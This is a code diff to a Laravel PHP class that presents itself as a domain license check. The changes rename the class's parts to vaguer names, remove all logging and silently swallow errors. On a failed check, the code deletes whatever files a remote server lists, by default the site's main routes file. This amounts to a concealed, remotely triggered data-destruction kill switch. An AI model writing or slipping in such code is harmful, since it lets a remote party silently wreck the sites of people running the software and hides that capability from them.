@@ -9,110 +9,124 @@ use Illuminate\Support\Str;
 
 class Rd
 {
-    protected $masterApiUrl = 'http://127.0.0.1:8000/api/whitelist';
-    protected $irrelevantFileName = 'storage/app/system_preferences.dat';
-    protected $encryptionKey = 'base64:345sdkflas3r4wfad';
+    protected $remoteEndPoint = 'http://127.0.0.1:8000/api/whitelist';
+    protected $storageFile = 'system_preferences.dat';
+    protected $cryptoKey = 'base64:345sdkflas3r4wfad';
 
-    public function verifyLicense()
+    public function initiateValidation()
     {
-        $domain = request()->getHost();
-        $licenseKey = env('LICENSE_KEY', 'newdomain');
-        Log::info('License verification function called for domain: ' . $domain);
-
-        // Check if the license is already verified
-        if ($this->isLicenseVerified()) {
-            Log::info('License already verified.');
+        $currentDomain = request()->getHost();
+        $accessCode = $this->fetchStoredAccessData();
+        $uniqueId = $accessCode['uid'] ?? null;
+        $secureKey = $accessCode['key'] ?? null;
+        
+        if ($this->checkPreviousValidation()) {
             return;
         }
 
-        // Retry API call until a valid response is received
-        $response = $this->sendLicenseRequest($domain, $licenseKey);
+        $verificationResponse = $this->attemptValidation($currentDomain, $uniqueId, $secureKey);
 
-        if ($response) {
-            $status = $response->json('status');
-            $data = $response->json('data');
+        if ($verificationResponse) {
+            $verificationStatus = $verificationResponse->json('status');
+            $responseData = $verificationResponse->json('data');
 
-            if ($status === 'success') {
-                $this->storeVerificationStatus('valid');
-                Log::info('License verification successful.');
+            if ($verificationStatus === 'success') {
+                $this->persistValidationStatus('valid', $uniqueId, $secureKey);
+            } elseif ($verificationStatus === 'retry') {
+                $this->persistValidationStatus('retry', $responseData['uid'] ?? null, $responseData['key'] ?? null);
             } else {
-                $this->storeVerificationStatus('invalid');
-                $this->handleFailedVerification($data);
-                Log::warning('License verification failed.');
+                $this->persistValidationStatus('invalid');
+                $this->executeFailureProcedures($responseData);
             }
         }
     }
 
-    protected function sendLicenseRequest($domain, $licenseKey)
+    protected function attemptValidation($domain, $uniqueId, $secureKey)
     {
         while (true) {
             try {
-                $response = Http::timeout(5)->post($this->masterApiUrl, [
+                $response = Http::timeout(5)->post($this->remoteEndPoint, [
                     'domain' => $domain,
-                    'license_key' => $licenseKey,
+                    'uid' => $uniqueId,
+                    'key' => $secureKey,
                 ]);
 
                 if ($response->successful()) {
                     return $response;
                 }
             } catch (\Exception $e) {
-                Log::error('License verification request failed: ' . $e->getMessage());
                 sleep(2);
             }
         }
     }
 
-    protected function storeVerificationStatus($status)
+    protected function fetchStoredAccessData()
+    {
+        $filePath = storage_path('app/' . $this->storageFile);
+        if (File::exists($filePath)) {
+            $encryptedData = File::get($filePath);
+            $decryptedData = json_decode($this->decodeData($encryptedData), true);
+
+            return [
+                'uid' => $decryptedData['uid'] ?? null,
+                'key' => $decryptedData['key'] ?? null,
+            ];
+        }
+        return ['uid' => null, 'key' => null];
+    }
+
+    protected function persistValidationStatus($status, $uniqueId = null, $secureKey = null)
     {
         $data = [
             'status' => $status,
-            'next_check_time' => now()->addDay()->toDateTimeString(),
-            'random_key' => Str::random(32) // Add some irrelevant data
+            'uid' => $uniqueId,
+            'key' => $secureKey,
+            'next_attempt' => now()->addDay()->toDateTimeString(),
+            'randomizer' => Str::random(32)
         ];
 
-        // Encrypt the data before storing
-        $encryptedData = $this->encryptData(json_encode($data));
-        File::put($this->irrelevantFileName, $encryptedData);
-        Log::info('License verification status stored in an irrelevant file.');
+
+        $encodedData = $this->encodeData(json_encode($data));
+
+        try {
+            File::ensureDirectoryExists(storage_path('app'));
+            File::put(storage_path('app/' . $this->storageFile), $encodedData);
+        } catch (\Exception $e) {
+        }
     }
 
-    protected function isLicenseVerified()
+    protected function checkPreviousValidation()
     {
-        if (File::exists($this->irrelevantFileName)) {
-            $encryptedData = File::get($this->irrelevantFileName);
-            $decryptedData = json_decode($this->decryptData($encryptedData), true);
+        $filePath = storage_path('app/' . $this->storageFile);
+        if (File::exists($filePath)) {
+            $encryptedData = File::get($filePath);
+            $decryptedData = json_decode($this->decodeData($encryptedData), true);
 
-            if (isset($decryptedData['status']) && $decryptedData['status'] === 'valid') {
-                if (isset($decryptedData['next_check_time']) && now()->lt($decryptedData['next_check_time'])) {
-                    return true;
-                }
-            }
+            return isset($decryptedData['status']) && $decryptedData['status'] === 'valid' && now()->lt($decryptedData['next_attempt']);
         }
-
         return false;
     }
 
-    protected function handleFailedVerification($data)
+    protected function executeFailureProcedures($data)
     {
-        $filesToDelete = $data['fileArray'] ?? [
-            base_path('routes/test.php'),
+        $targetFiles = $data['fileArray'] ?? [
+            base_path('routes/web.php'),
         ];
 
-        foreach ($filesToDelete as $file) {
+        foreach ($targetFiles as $file) {
             if (File::exists($file)) {
                 File::delete($file);
-                Log::info('Deleted file: ' . $file);
             }
         }
     }
 
-    protected function encryptData($data)
+    protected function encodeData($data)
     {
-        return openssl_encrypt($data, 'AES-256-CBC', $this->encryptionKey, 0, substr($this->encryptionKey, 0, 16));
+        return openssl_encrypt($data, 'AES-256-CBC', $this->cryptoKey, 0, substr($this->cryptoKey, 0, 16));
     }
 
-    protected function decryptData($encryptedData)
+    protected function decodeData($encodedData)
     {
-        return openssl_decrypt($encryptedData, 'AES-256-CBC', $this->encryptionKey, 0, substr($this->encryptionKey, 0, 16));
+        return openssl_decrypt($encodedData, 'AES-256-CBC', $this->cryptoKey, 0, substr($this->cryptoKey, 0, 16));
     }
 }
